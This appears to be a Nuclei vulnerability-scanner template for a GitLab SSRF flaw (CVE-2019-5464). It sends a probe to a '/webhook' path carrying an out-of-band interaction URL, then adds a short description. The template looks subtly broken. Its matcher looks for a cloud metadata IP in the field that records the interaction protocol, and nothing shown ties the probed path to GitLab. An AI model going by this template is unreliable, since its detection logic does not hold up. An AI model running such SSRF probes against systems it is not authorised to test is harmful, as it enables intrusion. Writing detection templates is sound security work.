id: CVE-2019-5464

info:
  name: GitLab SSRF via DNS Rebinding Protection Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: A flawed DNS rebinding protection issue in GitLab CE/EE 10.2 and later allows SSRF attacks.
  reference:
    - https://gitlab.com/gitlab-org/gitlab-ce/issues/63959
    - https://hackerone.com/reports/632101

http:
  - method: GET
    path:
      - "{{BaseURL}}/webhook?test={{interactsh-url}}"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
    matchers:
      - type: word
        words:
          - "169.254.169.254"
        part: interactsh_protocol
        condition: and
This template is designed to detect the SSRF vulnerability in GitLab by exploiting the DNS rebinding protection flaw. It uses an external interaction server to simulate the attack scenario described in the CVE and GitLab issue.